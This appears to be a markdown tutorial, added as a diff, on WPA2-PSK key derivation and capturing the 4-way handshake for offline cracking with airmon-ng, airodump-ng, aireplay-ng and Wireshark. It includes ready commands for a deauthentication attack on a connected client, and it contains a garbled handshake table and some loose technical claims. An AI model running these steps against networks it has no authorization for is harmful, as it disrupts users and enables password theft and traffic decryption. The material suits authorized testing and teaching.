@@ -1,0 +1,121 @@
+Analyzing **WPA2 (Wi-Fi Protected Access II)** security and capturing the **4-Way Handshake** with Wireshark is a fundamental step in wireless penetration testing and network forensics. This process demonstrates the security mechanism of WPA2 and the exploit used to capture the hashed passphrase for offline cracking.
+
+## 1\.  WPA2 Security Analysis
+
+WPA2 is currently the most widely deployed security standard for Wi-Fi networks (though being superseded by WPA3). It primarily relies on the **Advanced Encryption Standard (AES)** cipher within its **CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol)** encryption suite, offering strong confidentiality and integrity.
+
+### Key Security Components:
+
+  * **Authentication:** The network utilizes either **PSK (Pre-Shared Key)** for small offices/homes or **802.1X/EAP** (Extensible Authentication Protocol) with a RADIUS server for enterprises. This analysis focuses on the more common **WPA2-PSK**.
+  * **Key Derivation:** The WPA2-PSK key management process uses a series of steps to derive the final encryption key:
+    1.  **PMK (Pairwise Master Key):** Derived from the **PSK** (the passphrase), the SSID, and the SSID length using PBKDF2 (Password-Based Key Derivation Function 2) and SHA-1.
+    2.  **PTK (Pairwise Transient Key):** Derived during the **4-Way Handshake** from the PMK, the MAC addresses of the Access Point (AP) and the client, and two nonces (random numbers). The PTK is then split into several keys:
+          * Key Confirmation Key (KCK)
+          * Key Encryption Key (KEK)
+          * Temporal Keys (Encryption/Decryption)
+
+## 2\.  WPA2 4-Way Handshake Capture Methodology
+
+The 4-Way Handshake is a mechanism used to securely exchange the PTK components between the AP and the client **without transmitting the PMK or the PSK**. The critical vulnerability exploited in penetration testing is that the hash of the PSK (the PMK) is used to prove ownership of the key, and this proof is sent over the air, allowing it to be captured.
+
+### Tools Required (Kali Linux):
+
+1.  **Wireless Adapter:** A USB Wi-Fi adapter capable of **monitoring mode** (e.g., adapters supporting the `rtl8812au` or `rt3070` chipset).
+2.  **`airmon-ng`:** Part of the Aircrack-ng suite, used to put the wireless adapter into monitor mode.
+3.  **`airodump-ng`:** Used to scan for target networks and capture the handshake.
+4.  **Wireshark:** Used to analyze the captured packet file (`.cap` or `.pcap`).
+
+### Step-by-Step Capture Process:
+
+#### Step 1: Put Wireless Adapter into Monitor Mode
+
+Identify your wireless interface (usually `wlan0`) and switch it to monitor mode.
+
+```bash
+sudo airmon-ng start wlan0
+# The interface is usually renamed to something like 'wlan0mon' or 'mon0'
+```
+
+#### Step 2: Scan for Target AP and Identify Parameters
+
+Use `airodump-ng` to scan for nearby networks and identify the target's BSSID (AP MAC) and Channel.
+
+```bash
+sudo airodump-ng wlan0mon
+# Find your target network and note its BSSID and Channel (CH)
+# Example target: BSSID (AA:BB:CC:DD:EE:FF), Channel (6)
+```
+
+#### Step 3: Start Handshake Capture
+
+Begin capturing packets on the target channel, writing them to a file. Specify the target BSSID to filter traffic.
+
+```bash
+# -c [Channel] -bssid [Target BSSID] -w [Output File Name] [Monitor Interface]
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa2_capture wlan0mon
+```
+
+#### Step 4: Capture the Handshake (Deauthentication Attack)
+
+`airodump-ng` will only capture the handshake when a client first connects. To force a connection (and thus the handshake), you need to send a **deauthentication packet** to an existing client to disconnect them, forcing a re-connection.
+
+Open a second terminal window and use `aireplay-ng`:
+
+```bash
+# -0 [Number of deauth packets] -a [AP BSSID] -c [Client MAC Address]
+# Note: Use a connected client's MAC address from the airodump-ng window.
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+```
+
+*If successful, the `airodump-ng` window will display a message like `WPA Handshake: AA:BB:CC:DD:EE:FF`.* Stop the capture (`Ctrl+C`).
+
+Step 5: Stop Monitor Mode
+
+Return the wireless adapter to normal managed mode.
+
+```bash
+sudo airmon-ng stop wlan0mon
+```
+
+## 3\.  Analyzing the Handshake with Wireshark
+
+The captured file (`wpa2_capture-01.cap`) contains the handshake.
+
+### Step A: Open the Capture File
+
+Open the `.cap` file in Wireshark:
+
+```bash
+wireshark wpa2_capture-01.cap
+```
+
+### Step B: Filter and Locate the Handshake
+
+Apply a display filter to view only the relevant EAPOL (Extensible Authentication Protocol over LAN) frames that make up the handshake.
+
+```
+eapol
+```
+
+The 4-Way Handshake consists of four distinct frames:
+
+
+Message 1 Client | Sends **ANonce** (AP Nonce). 
+Message 2 Sends **SNonce** (Client Nonce) and the MIC (Message Integrity Code). **This frame is crucial.** |
+Message 3  Sends the Group Temporal Key (GTK) and re-sends ANonce and MIC. 
+Message 4 Confirmation, acknowledges receipt. 
+
+ Step C: Verification
+
+Verify that all four messages are present. The combination of data in **Messages 2 and 3** is what `aircrack-ng` or other cracking tools use. They take the captured data (ANonce, SNonce, MACs, etc.) and attempt to derive the PMK (from the PSK guess) that correctly generates the MIC. If the calculated MIC matches the captured MIC, the PSK guess is correct.
+Step D: Decryption (Optional but Educational)
+
+You can decrypt the subsequent traffic if you know the PSK.
+
+1.  In Wireshark, go to **Edit** $\to$ **Preferences**.
+2.  Expand **Protocols** $\to$ **IEEE 802.11**.
+3.  Click the **Edit...** button next to **Decryption Keys**.
+4.  Click `+` and set the key type to **wpa-pwd**.
+5.  The format is: `[PSK/Passphrase]:[SSID]`
+      * Example: `MySecurePassword:MyWiFiName`
+6.  Click **OK**. Wireshark will now decrypt the subsequent data packets, showing the clear-text content after the handshake is complete.
